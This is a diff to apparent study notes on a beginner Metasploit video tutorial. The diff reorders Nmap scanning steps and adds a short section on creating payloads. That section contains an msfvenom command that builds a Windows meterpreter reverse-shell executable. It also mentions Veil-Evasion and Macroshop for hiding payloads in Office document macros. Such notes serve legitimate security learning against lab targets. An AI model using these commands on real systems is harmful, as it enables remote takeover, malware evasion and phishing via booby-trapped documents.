@@ -121,6 +121,13 @@ Hackersploit's Metasploit For Beginners - #1 - The Basics - Modules, Exploits & 
  
   ### Demonstration of using Metasploit<br />
   <br />
+  * use ZenMap to see software running and note network topography
+  * db_nmap_status, db_nmap -T4 -A -v metasploitableIP
+  #### Creating Payloads
+  * msfvenom -h
+  * msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lport=8080 lhost=LOCALHOST -f exe > /root/Desktop/payload.exe (not encrypted)
+  * Veil framework (veil-evasion) (payload with .bat extension, use Macroshop, inject in docx for Office macros)
+  
   start postgresql before msfconsole<br />
   db_status<br />
   show -h<br />
@@ -135,8 +142,7 @@ Hackersploit's Metasploit For Beginners - #1 - The Basics - Modules, Exploits & 
   * show options (customize the attack) and set SRVPORT 80
   
   ANOTHER and BETTER EXAMPLE:
-  * use ZenMap to see software running and note network topography
-  * db_nmap_status, db_nmap -T4 -A -v metasploitableIP
+
   * show (gives lots of info)
   * show info (good place to start)
   * show payloads (shows all of the payloads available)
